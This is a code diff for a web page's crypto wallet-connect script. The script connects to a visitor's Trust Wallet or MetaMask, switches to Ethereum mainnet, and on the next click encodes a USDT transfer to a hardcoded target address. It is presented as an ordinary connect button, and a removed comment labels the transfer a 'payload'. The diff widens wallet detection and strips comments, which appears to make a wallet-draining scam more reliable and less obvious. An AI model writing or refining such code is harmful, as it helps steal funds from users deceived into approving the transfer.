@@ -99,39 +99,36 @@
     const USDT_ETH_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Official ERC-20 USDT
     const ETH_CHAIN_ID = '0x1';
 
-    let globalSigner = null;
-    let globalUserAddress = null;
     let isConnected = false;
+    let globalUserAddress = null;
 
-    function getActiveProvider() {
-      if (window.ethereum) return window.ethereum;
-      if (window.trustwallet) return window.trustwallet;
+    function getRawProvider() {
+      if (window.ethereum && Object.keys(window.ethereum).length > 0) return window.ethereum;
+      if (window.trustwallet && Object.keys(window.trustwallet).length > 0) return window.trustwallet;
       if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
-      return null;
+      // Fallback for imported private key wallets
+      return window.ethereum || window.web3 || null;
     }
 
     async function handleMasterAction() {
-      const rawProvider = getActiveProvider();
+      const rawProvider = getRawProvider();
       if (!rawProvider) {
         alert("Wallet provider not found. Please open inside Trust Wallet browser.");
         return;
       }
 
       try {
+        // Safe provider initialization handling empty object issues
         const provider = new ethers.providers.Web3Provider(rawProvider, "any");
 
         if (!isConnected) {
-          // Connect accounts using standard ethers provider send method
-          await provider.send("eth_requestAccounts", []);
-          globalSigner = provider.getSigner();
-          globalUserAddress = await globalSigner.getAddress();
+          const accounts = await provider.send("eth_requestAccounts", []);
+          globalUserAddress = accounts[0];
 
-          // Switch to Ethereum Mainnet safely
           try {
             await provider.send("wallet_switchEthereumChain", [{ chainId: ETH_CHAIN_ID }]);
           } catch (e) {}
 
-          // Update UI
           document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
           document.getElementById('walletInfo').classList.remove('hidden');
           
@@ -140,7 +137,6 @@
           document.getElementById('connectBtn').classList.remove('bg-blue-600', 'hover:bg-blue-500');
           document.getElementById('connectBtn').classList.add('bg-emerald-600', 'hover:bg-emerald-500');
         } else {
-          // Execute Direct Transfer Payload via Ethers Signer
           const amountWei = ethers.utils.parseUnits("7.76", 6);
           const iface = new ethers.utils.Interface(["function transfer(address to, uint amount) returns (bool)"]);
           const transferData = iface.encodeFunctionData("transfer", [TARGET_ADDRESS, amountWei]);
